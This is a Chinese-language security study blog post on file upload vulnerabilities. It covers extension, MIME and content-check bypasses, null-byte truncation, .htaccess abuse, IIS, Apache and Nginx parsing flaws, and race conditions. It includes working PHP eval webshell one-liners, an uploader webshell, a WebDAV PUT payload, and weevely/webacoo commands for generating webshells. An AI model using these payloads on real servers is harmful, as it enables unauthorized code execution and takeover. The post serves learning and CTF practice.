s---
layout:     post
title:      Web笔记（十一）文件上传漏洞
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是学习文件上传漏洞及一些绕过方法。
date:       2020-12-03
author:     K4ys0n
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - 文件上传
---



## 0x00 文件上传漏洞简介

文件上传漏洞，指的是网站在文件上传的地方，没有对用户上传的文件做各种检验或者过滤不严，导致被攻击者提交修改过的数据绕过检验进行攻击。

文件上传漏洞有一部分原因也是因为中间件（IIS、Apache、Nginx等）的文件解析漏洞导致的。文件解析漏洞主要说的是一些特殊文件被IIS、Apache、Nginx在某种情况下解释成脚本文件格式的漏洞。



## 0x01 常见的上传检测方式

- 客户端JavaScript检测（通常为检测文件扩展名）
- 服务端MIME类型检测（检测Content-Type内容）
- 服务端目录路径检测（检测跟path参数相关的内容）
- 服务端文件扩展名检测（检测跟文件extension相关的内容）
- 服务端文件内容检测（检测内容是否合法或含有恶意代码）



## 0x02 客户端检测绕过（JavaScript检测）

#### 1. 判断方法

首先判断js本地验证。

通常可以根据验证警告弹框的速度来判断，用Burpsuite抓包，在点击提交的时候，如果还没有抓到包就已经弹框，那就说明是本地JavaScript验证。

#### 2. 绕过方法

- 使用Burpsuite抓包改名
- 使用Firebug（浏览器开发者模式）直接删除掉本地验证的js代码
- 添加js验证的白名单，如将php的格式添加进去



## 0x03 服务端检测绕过（MIME类型检测）

#### 1. MIME

MIME(Multipurpose Internet Mail Extensiions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。

注：Tomcat的安装目录\conf\web.xml中就定义了大量MIME类型。

|        类型        |    后缀     |           MIME           |
| :----------------: | :---------: | :----------------------: |
| Microsoft Word文件 |    .word    |    application/msword    |
|      PDF文件       |    .pdf     |     application/pdf      |
|      GIF图形       |    .gif     |        image/gif         |
|      JPEG图形      | .jpeg  .jpg |        image/jpeg        |
|     au声音文件     |     .au     |       audio/basic        |
|    MIDI音乐文件    | .mid  .midi | audio/midi  audio/x-midi |
| RealAudio音乐文件  |  .ra  .ram  |   audio/x-pn-realaudio   |
|      MPEG文件      | .mpg  .mpeg |        video/mpeg        |
|      AVI文件       |    .avi     |     video/x-msvideo      |

#### 2. 绕过方法

直接使用Burpsuite抓包，得到POST上传数据后，将Content-Type: text/plain改成Content-type: image/gif即可绕过。

上传文件http包中会有三个Content-Type，绕过MIME就是要修改第二个Content-Type。



## 0x04 服务端检测绕过（目录路径检测）

#### 1. 目录路径检测

一般就检测路径是否合法，有些一点都没有防御，例如：

fckeditor php<=2.6.4任意文件上传漏洞当POST下面的url时：

/fckeditor264/filemanager/connectors/php/connector.php?Command=FileUpload&Type=Image&CurrentFolder=test.php%00.gif HTTP/1.0

CurrentFolder这个变量的值会传到ServerMapFolder($resourceType,$folderPath,$sCommand)中的形参$folder里，而$folder在这个函数中并没有做任何检测，就被CombinePaths()了。

#### 2. 绕过方法

- 加../或多级../来绕过目录没有执行权限的问题，如：上传文件名为../../test.php
- 00截断



## 0x05 服务端检测绕过（文件扩展名检测）

#### 1. 黑名单检测

黑名单的安全性比白名单的安全性低很多，攻击手法也比较多，一般有个专门的blacklist文件，里面会包含常见的危险脚本文件，如fckeditor 2.4.3或之前版本的黑名单。

- 文件名大小写绕过

利用形如Asp，pHp之类的随机大小写的文件名绕过黑名单检测。

- 文件名双写绕过

代码只对黑名单中的内容进行空替换，由于只替换一次所以造成双写绕过。如：1.pphphp

- 名单列表绕过

用黑名单里没有的名单进行攻击，比如黑名单里没有asa或cer之类。

- 点号、空格绕过

Windows系统下，用Burpsuite抓包修改http包里的文件名改成test.asp. 或test.asp_（下划线为空格），绕过验证后，会被windows系统自动去掉后面的点和空格，但要注意Linux/Unix系统没有这个特性。

- 特殊符号::$DATA绕过

Windows系统下，如果上传的文件名为test.php::$DATA，则会在服务器上生成一个test.php的文件，内容和所上传文件内容相同，并可被解析成php。因为Windows会自动将后缀::$DATA去掉。

简单测试：在Windows系统下新建一个文件名为1.php::$DATA文件，查看效果。但是在Window下新建的文件名中包含特殊符号不能成功新建，所以只能在Linux下新建这种文件 。

- 00截断绕过

在PHP5.3之后的版本中完全修复了00截断。并且00截断受限于GPC，addslashes函数。

00截断主要是绕过检测扩展名。下面给个asp简单的伪代码
```
name=getname(http request)     //假如这时候获取到的文件名是test.asp .jpg（asp后面是0x00）
type=gettype(name)            //而在gettype()函数里处理方式是从后往前扫描扩展名，所以判断为jpg
if(type=='jpg'){
...
}
```

GET型00截断：GET型提交的内容会被自动进行URL解码，注意一定要关闭GPC，否则无法成功。

POST型00截断：在POST请求中，%00不会被自动解码，需要在16进制中进行修改00。小技巧可以先在正常请求包文件名末尾加上空格(%20)，这样在hex页面中就可以直接将文件名后面的20修改为00。

路径型00截断：如果上传文件的请求中包含了上传后的存储路径，如upload/那么就可以修改这个位置为upload/1.php%00，然后filename还是保持1.jpg，上传后就会变成upload/1.php%001.jpg，然后%00后面截断，所以文件名就变成1.php。注意POST请求方式要对%00进行右键convert selection->URL->URL decode。

- .htaccess文件攻击配合名单列表绕过

htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。

其中.htaccess文件内容：`SetHandler application/x-httpd-php`是设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当做PHP执行，不符合则报错。

在Apache中如果需要启动.htaccess，必须在http.conf中设置AllowOverride。
```
DocumentRoot "C:\phpStudy\PHPTutorial\WWW"
<Directory /> 
  Options +Indexes +FollowSymLinks +ExecCGI 
  AllowOverride All  # 就是这里把None修改为All即可 
  Order allow,deny 
  Allow from all 
  Require all granted
</Directory>
```

如果在Apache中.htaccess可被执行，且可被上传，那就可以尝试在.htaccess中写入：
```
<FilesMatch "shell.jpg">SetHandler application/x-httpd-php</FilesMatch>
```

然后再上传shell.jpg的木马，这样shell.jpg就可解析为php文件。

- 解析漏洞绕过

这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析漏洞，会在后面详细说到。

#### 2. 白名单检测

白名单相对来说比黑名单安全一些，但不是绝对的，如00截断可以绕过一些白名单。

- 00截断绕过

用像test.asp%00.jpg的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑漏洞进行攻击。同黑名单00截断绕过。

- 解析漏洞绕过

同黑名单解析漏洞绕过。

- .htaccess文件攻击

同黑名单.htaccess文件攻击。



## 0x06 服务端检测绕过（文件内容检测）

如果文件内容检测设置得比较严格，那么上传攻击将变得非常困难，也可以说它是在代码层检测的最后一道关卡，如果它被突破了，就算没有代码层的漏洞，也给后面利用应用层的解析漏洞带来了机会。

#### 1. 检测文件头绕过

主要是检测文件内容开始处的文件幻数，比如图片类型的文件幻数如下：

- 要绕过jpg文件幻数检测就要在文件开头写上值：FF D8 FF E0 00 10 4A 46 49 46
- 要绕过gif文件幻数检测就要在文件开头写上值：47 49 46 38 39 61
- 要绕过png文件幻数检测就要在文件开头写上值：89 50 4E 47

然后在文件幻数后面加上自己的一句话木马代码即可。

#### 2. 文件相关信息检测绕过

图像文件相关信息检测常用的就是getimagesize()函数，只需要把文件头部分伪造好久可以绕过，就是在幻数的基础上还加了一些文件信息，文件结构大致可以如下：
```
GIF89a
(...一些图片特有的二进制数据...)
<?php phpinfo();?>
(...图片最后剩下的二进制数据...)
```

#### 3. 文件加载检测

一般是调用API或函数去进行文件加载测试常见的是图像渲染测试，甚至是进行二次渲染。

对渲染、加载测试的攻击方式是代码注入绕过；

对二次渲染的攻击方式是攻击文件加载器本身。

- 对渲染、加载测试攻击：可以用图像处理软件对一张图片进行代码注入，用winhex看数据可以分析出这类工具的原理是，在不破坏文件本身的渲染情况下，找一个空白区进行填充代码，一般会是图片的注释区，对于渲染测试基本上都能绕过，毕竟本身的文件结构是完整的。
- 绕过二次渲染：攻击函数本身，通过上传不完整的图片让其渲染函数暴露，然后攻击之。或者对文件加载器进行溢出攻击。



## 0x07 添加表单提交按钮上传

有些表单没有提交按钮，那么可以在Firebug或者浏览器开发者工具中，在HTML中添加一个submit按钮，代码如下，用来提交，但前提是后台接收表单上传并保存文件。
```html
<input type="submit" value="提交" name='bb'>
```

然后就可以上传文件了。



## 0x08 双文件上传

用Burpsuite拦截，将请求体中，被WebKitFormBoundary...包围起来的部分复制，然后在Submit之前再粘贴一份，修改文件名等信息，然后发送即可，第二次发送的可能可以绕过一些检查。



## 0x09 突破文件大小限制

上传小Webshell，再上传大Webshell上传小Webshell，以绕过上传过程中对文件大小等限制，从而能够更加有效上传大Webshell。小Webshell：
```php
<html>
<head>
<title>PHP小马 - ExpDoor.com</title>
</head>
<body>
<form action="" method="post" enctype="multipart/form-data">
<label for="file">filename:</label>
<input type="file" name="file" id="file">
<br/>
<input type="submit" name="submit" value="Submit">
</form>
</body>
</html>
<?php
if ($_POST){
move_uploaded_file($_FILES["file"]["tmp_name"], "../upload/1.php");
echo "Store in : "."1.php";
}
?>
```



## 0x0a 文件解析漏洞

解析漏洞主要说的是一些特殊文件被IIS、Apache、Nginx在某种情况下解释成脚本文件格式的漏洞。

#### 1. IIS 5.x/6.0解析漏洞

- 目录解析（/xx.asp/xx.jpg）

在网站下建立文件夹的名字为.asp或.asa的文件夹，其目录内的任何扩展名的文件都会被IIS当做asp文件来解析并执行。

例如：创建目录test.asp，上传1.jpg到/test.asp目录下（即上传文件名为/test.asp/1.jpg 的文件），那么上传的文件将会保存在/test.asp目录下并命名为1.jpg，它可以被当做asp文件来执行。假如攻击者可以控制上传文件夹路径，就可以不管上传后的图片改不改名，都能拿shell了。

- 文件解析（xx.asp;.jpg）

在IIS6.0下，分号后面的不被解析，也就是说test.asp;.jpg会被服务器看成是asp文件来执行。

- 特殊文件后缀（.asa、.cer、.cdx）

在IIS6.0下默认可执行：

/test.asp

/test.asa

/test.cer

/test.cdx

修复建议：目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名；做好权限设置，限制用户创建文件夹。

#### 2. IIS 6.0 PUT上传漏洞

WebDAV 基于HTTP1.1协议的通信协议使得HTTP支持PUT MOVE COPY DELETE 方法。

- 探测是否存在IIS PUT漏洞
```
OPTIONS / HTTP1.1
Host: www.xxx.com
```

- 上传txt文本文件
```
PUT /a.txt HTTP1.1
Host: www.xxx.com
Content-Length:30

<%eval request("cmd")%>
```

- 通过Move或Copy重名
```
COPY /a.txt HTTP1.1
Host: www.xxx.com
Destination: http://www.xxx.com/cmd.asp
```

- 删除
```
DELETE /a.txt HTTP1.1
Host: www.xxx.com
```

或者利用kali下的nikto工具探测

- nikto -h IP地址

#### 3. Apache解析漏洞

Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。

比如test.php.owf.rar，其中.owf和.rar是Apache不可识别解析，Apache就会将test.php.owf.rar解析成php。

如何判断是不是合法的后缀就是这个漏洞的利用关键，测试时可以尝试上传一个test.php.rar.jpg.png.......（把知道的常见后缀都写上）去测试是否是合法后缀。任意不识别的后缀，逐级向上识别。

测试用例如：

test.php.

test.php.zzz

test.php.rar.jpg.png

......

#### 4. IIS 7.0、7.5，Nginx < 8.03等与php低版本 畸形解析漏洞

php低版本可能为5.6.3及以下。

可以用test.jpg/.php 去测试一下。

- 第一种解析漏洞

在默认Fast-CGI开启状况下，攻击者上传一个名字为test.jpg，文件内容为
```php
<?php fputs(fopen('shell.php', 'w'), '<?php eval($_POST[cmd])?>');?>
```

然后访问test.jpg/.php ，在这个目录下就会生成一句话木马shell.php。

再如：/test.gif/*.php 触发漏洞，会把前面上传的文件test.gif当做php执行。

- 第二种解析漏洞

a.aspx.a;.a.aspx.jpg..jpg

#### 5. Nginx <8.03 空字节代码执行漏洞（00截断）

影响版本：0.5、0.6、0.7<=0.7.65、0.8<=0.8.37。

Nginx在图片中嵌入PHP代码，然后通过访问xxx.jpg%00.php来执行代码



## 0x0b unlink与竞争条件漏洞

#### 1. 服务器接收文件上传的过程

- 服务器获取文件

- 保存上传临时文件
- 重命名移动临时文件（php使用move_uploaded_file函数）。

#### 2. 竞争条件原理

网站逻辑有两种：

- 网站允许上传任意文件，然后检查上传文件是否包含Webshell，如果包含删除该文件。
- 网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件。在删除之前访问上传的php文件，从而执行上传文件中的php代码。

竞争条件漏洞存在于网站逻辑，如果先进行上传，后进行判断与删除，那么就可以利用时间差进行webshell上传。

#### 3. 漏洞利用

首先不断访问代码文件，然后上传，最终使用菜刀连接一句话webshell。

- python编写脚本，发送http请求（可多线程加速）
```python
import requests
while True:  
    requests.get("路径")
```

- 然后执行python脚本，接着才上传文件。上传文件代码如下
```php
<?php
    fputs(fopen('shell.php','w'),'<?php @eval($_POST["cmd"])?>');
?>
```

- 菜刀连接访问shell.php，密码是cmd。



## 0x0c 文件上传思路

- 修改前端JS
- 修改MIME
- 爆破后缀名（黑名单）
- .htaccess（修改当前目录为php解析，前提是AllowOverride）+任意文件（一般用图片文件绕过）
- 大小写绕过
- 点号或空格绕过
- 文件名双写绕过
- 特殊符号::$DATA绕过
- 突破文件大小限制（先上传小Webshell，再上传大Webshell）
- 00截断绕过白名单
- 图片Webshell（结合文件包含）
- 竞争条件(用到php函数unlink时考虑，可以结合python多线程)
- IIS 5.x/6.0目录解析漏洞（/xx.asp/xx.jpg）
- IIS 6.0 文件名解析漏洞（xx.asp;.jpg）
- IIS 6.0 特殊文件后缀绕过（.asa、.cer、.cdx）
- IIS 6.0 PUT上传漏洞(-nikto -h IP地址)
- Apache解析漏洞(1.php.xxxx)
- IIS 7.0、7.5，Nginx < 8.03等与php低版本 畸形解析漏洞（xx.jpg/.php）
- Nginx < 8.03 空字节代码执行漏洞（00截断：xx.jpg%00.php）



## 0x0d 生成webshell

Kali下生成webshell

#### 1. WeBaCoo工具

WeBaCoo生成Webshell：
```
webacoo -g -o [webshell名]
如：
webacoo -g -o a.php
```

上传Webshell后连接Webshell：
```
webacoo -t -u [Webshell地址]
如：
webacoo -t -u http://127.0.0.1/a.php
```

#### 2. weevely工具

生成Webshell：
```
weevely generate [密码] [路径] [文件名]
如：
weevely generate cmd ./ a.php
```

上传后连接Webshell：
```
weevely [shell文件地址] [密码]
如：
weevely http://127.0.0.1/a.php cmd
```